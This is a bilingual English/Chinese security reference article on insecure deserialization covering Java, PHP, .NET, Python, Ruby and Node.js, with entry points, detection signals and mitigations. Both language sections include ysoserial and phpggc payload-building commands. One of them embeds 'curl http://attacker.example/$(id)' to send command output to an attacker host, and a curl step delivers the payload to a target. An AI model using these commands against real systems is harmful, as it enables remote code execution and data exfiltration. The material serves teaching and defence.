---
id: deserialization-insecure
title_en: Insecure Deserialization
title_zh: 不安全的反序列化
summary_en: Serialisation turns an object into bytes so it can be stored or sent. Deserialisation turns bytes back into an object — and if the bytes are yours to choose, you are choosing what the application instantiates, which is one step away from choosing what it executes.
summary_zh: 序列化把对象变成字节，便于存储或传输；反序列化把字节变回对象。而如果那些字节由你决定，你决定的就是应用会实例化什么 —— 距离"决定它执行什么"只差一步。
tags: [web, deserialization, java, php, dotnet, rce, bugbounty]
tools: [ysoserial, ysoserial.net, phpggc, marshalsec, gadgetinspector]
attck: [T1190, T1059]
platform: [web]
difficulty: advanced
updated: 2026-10-08
---

<!-- lang:en -->
### The shape of the bug

Every language has a way to turn a live object into bytes and back. The danger is not in the format, it is in what reconstruction triggers:

- The class is **instantiated**, running its constructor or its magic methods.
- Fields are **set** to attacker-chosen values.
- Framework and library code that runs on those events fires.

So an application that deserialises untrusted data has handed you a remote object constructor, and the interesting question becomes: which classes on the classpath, when built with my values, end up calling something dangerous? A chain of such classes is a **gadget chain**.

Two practical consequences. First, the vulnerable code often does not look like parsing at all — it is a session store, a queue consumer or a cache. Second, exploitability depends on the libraries present, so the same code is exploitable on one deployment and not another.

### Java: where this is most common and most dangerous

The wire format starts with the magic bytes `ac ed 00 05`, which is `rO0AB` in base64 — a string worth grepping for in every request and cookie.

Entry points to look for:

- HTTP bodies with `Content-Type: application/x-java-serialized-object`, or a raw body that base64-decodes to `rO0AB`.
- **RMI** and **JMX** endpoints, including the registry on 1099.
- **JMS** queues and any message broker feeding a Java consumer.
- **WebLogic T3/IIOP** (CVE-2015-4852 and friends), **JBoss**, **Jenkins** remoting.
- Session replication between application servers, and any cookie holding a serialised session.
- Spring and other frameworks' caches with a serialising store.

`ysoserial` builds payloads for the gadget chains that exist in a given classpath:

```bash
# list available chains
java -jar ysoserial.jar

# a classic: CommonsCollections against a vulnerable app
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.example/$(id)' > payload.bin

# hand it over
curl -s --data-binary @payload.bin -H 'Content-Type: application/x-java-serialized-object' https://target/api
```

The chains differ by library and version, and picking the wrong one produces a deserialisation error rather than a shell — which is itself useful information about what is on the classpath.

### PHP: the magic methods

PHP's `unserialize()` on user input is the classic form, and the exploitation model is different from Java: instead of pre-built chains, you often assemble one from the classes the application already has.

```php
// the dangerous call
$obj = unserialize($_COOKIE['session']);

// the methods that matter in your classes
__wakeup()      // called on unserialize
__destruct()    // called when the object is freed
__toString()    // called when cast to string
__get() / __set() / __call() / __invoke()
```

A POP chain is a sequence: an entry object whose `__destruct` calls a method on a property you control, whose `__toString` builds a path used in a file function, and so on. `phpggc` ships chains for common frameworks:

```bash
phpggc -l                          # list gadget chains
phpggc Monolog/RCE1 system id -b   # base64 payload
```

Two extensions of the idea are worth knowing because they bypass "we only use `unserialize` on trusted data":

- **`phar://` deserialisation.** A PHAR archive's metadata is unserialised when the file is accessed through the `phar://` wrapper — so a *file operation* like `file_exists($path)` on an attacker-supplied path can trigger it, with no `unserialize` call anywhere.
- **Session deserialisation**, where the session handler unpacks a cookie or a file the attacker can influence.

### Other runtimes, briefly

| Runtime | The call | The payload |
|---|---|---|
| Python | `pickle.loads`, `yaml.load` | `__reduce__` returning a callable; `!!python/object/apply` in YAML |
| Ruby | `Marshal.load` | As with Java, gadgets come from loaded libraries (Rails is a rich source) |
| .NET | `BinaryFormatter`, `LosFormatter`, `NetDataContractSerializer` | `ysoserial.net`; `TypeNameHandling.All` in Json.NET is the JSON-shaped version |
| Node.js | `node-serialize`'s `unserialize` | `_$$ND_FUNC$$_` with an IIFE; `funcster` similar |

ASP.NET **ViewState** deserves its own line: when a `machineKey` is leaked and the application runs on an old framework version, a serialised ViewState is a direct code execution primitive, and the payload arrives in a normal-looking form field.

### Finding it in the wild

- Grep responses, cookies and redirects for `rO0AB`, or request bodies that start with `ac ed`.
- In PHP, look for values resembling `O:8:"stdClass":1:{...}` and `a:2:{...}`.
- A base64 blob in a cookie that is not a JWT is worth decoding — the first bytes tell you which runtime you are looking at.
- ViewState is a base64 parameter named `__VIEWSTATE`.
- Anything named `data`, `state`, `payload`, `__session` or `serialized` that is opaque and long.

### Detection

Deserialisation gives defenders an unusually clear signal: **the format itself**. A request body whose first bytes are a Java serialisation magic, or a cookie that decodes to a PHP object, is almost never legitimate traffic for a JSON API.

- Alert on `ac ed 00 05` / `rO0AB` in bodies, headers and cookies.
- PHP: alert on `O:` and `a:` object syntax arriving in parameters.
- Java: Java 9+ has a serialisation filter (`jdk.serialFilter`); log rejections, they are reconnaissance.
- Watch for deserialisation *errors* in logs — a probe leaves a stack trace, and a spike is a sign of chain enumeration.
- On the network side, an outbound HTTP or LDAP request originating from a JVM that normally makes none is the payload calling home.

### Mitigation

- **Do not deserialise untrusted data.** This is the whole fix; everything else is containment. Use JSON with an explicit schema, and treat the parser's type system as a security boundary.
- **Java**: set a global serialisation filter (`jdk.serialFilter` / `ObjectInputFilter`) with an allow-list of the classes you actually need. This neutralises chains you have never heard of.
- **Java**: patch the framework (WebLogic, JBoss, Jenkins) — most real-world exploitation is against known, fixed deserialisation endpoints.
- **PHP**: avoid `unserialize` on input entirely; use `json_decode`. If you must, `unserialize($data, ['allowed_classes' => false])` blocks object injection. Disable the `phar://` wrapper for user-controlled paths where possible.
- **.NET**: remove `BinaryFormatter` from the codebase, and set `ViewStateMac` on with a rotated `machineKey` (and a framework version that enforces it).
- **Authenticate the serialised data**: signed or encrypted cookies raise the bar from "craft a payload" to "steal a key", but they are not a substitute for not deserialising.
- **Run with least privilege** so a successful chain lands in a container that cannot reach the interesting things.

<!-- lang:zh -->
### 这个漏洞的形状

每种语言都有把活动对象变成字节、再变回来的机制。危险不在格式本身，而在于**重建过程触发了什么**：

- 类被**实例化**，构造器或魔术方法被执行。
- 字段被**赋值为**攻击者选定的内容。
- 监听这些事件的框架与库代码被触发。

所以，一个反序列化不可信数据的应用，等于交给你一个远程对象构造器。接下来的问题就变成了：classpath 上哪些类被我用这些值构造出来之后，会去调用危险的东西？这样串起来的类就是一条 **gadget chain（利用链）**。

两个实际后果。第一，出问题的代码常常**看起来根本不像解析**——它是会话存储、消息队列消费者或缓存。第二，可利用性取决于现有库，所以同一份代码在一个部署上能打、在另一个上不能。

### Java：最常见，也最危险

它的线格式以魔法字节 `ac ed 00 05` 开头，base64 后就是 `rO0AB` —— 一个值得在所有请求和 cookie 里 grep 的字符串。

要找的入口：

- `Content-Type: application/x-java-serialized-object` 的请求体，或 base64 解码后以 `rO0AB` 开头的裸请求体。
- **RMI** 与 **JMX** 端点，包括 1099 上的注册表。
- **JMS** 队列，以及任何喂给 Java 消费者的消息中间件。
- **WebLogic T3/IIOP**（CVE-2015-4852 那一系列）、**JBoss**、**Jenkins** remoting。
- 应用服务器之间的会话复制，以及任何装着序列化会话的 cookie。
- Spring 等框架使用序列化存储的缓存。

`ysoserial` 能针对给定 classpath 上存在的链生成 payload：

```bash
# 列出可用的链
java -jar ysoserial.jar

# 经典组合：对存在漏洞的应用打 CommonsCollections
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.example/$(id)' > payload.bin

# 发出去
curl -s --data-binary @payload.bin -H 'Content-Type: application/x-java-serialized-object' https://target/api
```

链随库和版本而异，选错链的结果是反序列化报错而不是拿到 shell —— 而报错本身也是有价值的信息，它告诉你 classpath 上有什么。

### PHP：魔术方法

对用户输入调用 `unserialize()` 是经典形态，而它的利用模型和 Java 不同：往往不是用现成的链，而是**用应用自己已有的类拼一条**出来。

```php
// 危险调用
$obj = unserialize($_COOKIE['session']);

// 你的类里真正要紧的方法
__wakeup()      // unserialize 时调用
__destruct()    // 对象释放时调用
__toString()    // 被当成字符串时调用
__get() / __set() / __call() / __invoke()
```

POP 链就是一条序列：入口对象的 `__destruct` 调用了某个你可控属性上的方法，那个方法的 `__toString` 又拼出一个被文件函数使用的路径，如此接下去。`phpggc` 内置了常见框架的链：

```bash
phpggc -l                          # 列出可用链
phpggc Monolog/RCE1 system id -b   # 生成 base64 payload
```

有两种延伸值得知道，因为它们能绕过"我们只对可信数据用 `unserialize`"：

- **`phar://` 反序列化。** 通过 `phar://` 包装器访问 PHAR 归档时，它的元数据会被反序列化 —— 于是对一个攻击者可控路径做**文件操作**（比如 `file_exists($path)`）就能触发，代码里根本没有 `unserialize` 调用。
- **会话反序列化**：会话处理器解包一个攻击者能影响的 cookie 或文件。

### 其他运行时（简略）

| 运行时 | 那个调用 | payload 形态 |
|---|---|---|
| Python | `pickle.loads`、`yaml.load` | `__reduce__` 返回可调用对象；YAML 里的 `!!python/object/apply` |
| Ruby | `Marshal.load` | 与 Java 类似，链来自已加载的库（Rails 是富矿） |
| .NET | `BinaryFormatter`、`LosFormatter`、`NetDataContractSerializer` | 用 `ysoserial.net`；Json.NET 的 `TypeNameHandling.All` 是 JSON 形态的版本 |
| Node.js | `node-serialize` 的 `unserialize` | `_$$ND_FUNC$$_` 配 IIFE；`funcster` 类似 |

ASP.NET 的 **ViewState** 值得单独一行：当 `machineKey` 泄漏、且应用跑在旧版框架上时，一个序列化的 ViewState 就是直接的代码执行原语，而 payload 是以一个看起来很普通的表单字段送进来的。

### 在真实流量里找

- 在响应、cookie 与跳转里 grep `rO0AB`，在请求体里找以 `ac ed` 开头的。
- PHP 那边找形如 `O:8:"stdClass":1:{...}` 和 `a:2:{...}` 的值。
- cookie 里不是 JWT 的 base64 值都值得解一下 —— 开头几个字节就会告诉你面对的是哪个运行时。
- ViewState 是一个名为 `__VIEWSTATE` 的 base64 参数。
- 任何叫 `data`、`state`、`payload`、`__session`、`serialized` 的、不透明又很长的东西。

### 检测

反序列化给了防守方一个异常清晰的信号：**格式本身**。请求体头几个字节是 Java 序列化魔法值，或者一个 cookie 解码后是 PHP 对象，对 JSON API 来说几乎从不可能是正常流量。

- 对请求体、请求头、cookie 里出现的 `ac ed 00 05` / `rO0AB` 告警。
- PHP：对参数里出现 `O:` 与 `a:` 对象语法告警。
- Java：Java 9+ 有序列化过滤器（`jdk.serialFilter`），把拒绝事件记下来 —— 那是侦察。
- 关注日志里的反序列化**报错**：一次探测会留下堆栈，报错激增就是有人在枚举链。
- 网络侧，一个平时不发外连的 JVM 突然发出 HTTP 或 LDAP 请求，就是 payload 在回连。

### 缓解

- **不要反序列化不可信数据。** 这就是全部修复，其余都只是控制影响面。用带显式 schema 的 JSON，并把解析器的类型系统当成安全边界。
- **Java**：配置全局序列化过滤器（`jdk.serialFilter` / `ObjectInputFilter`），只放行你真正需要的类。这能挡掉你从没听说过的链。
- **Java**：给框架打补丁（WebLogic、JBoss、Jenkins）—— 现实中的利用绝大多数打的是已知且已修复的反序列化端点。
- **PHP**：彻底避免对输入用 `unserialize`，改用 `json_decode`。实在要用，`unserialize($data, ['allowed_classes' => false])` 能挡住对象注入。对用户可控路径尽量禁用 `phar://` 包装器。
- **.NET**：把 `BinaryFormatter` 从代码库里移除，开启 `ViewStateMac` 并轮换 `machineKey`（框架版本也要能强制它）。
- **给序列化数据做认证**：签名或加密的 cookie 会把门槛从"构造 payload"抬到"偷一把密钥"，但它不能替代"不反序列化"。
- **最小权限运行**，让成功的链落在一个够不着核心资产的容器里。
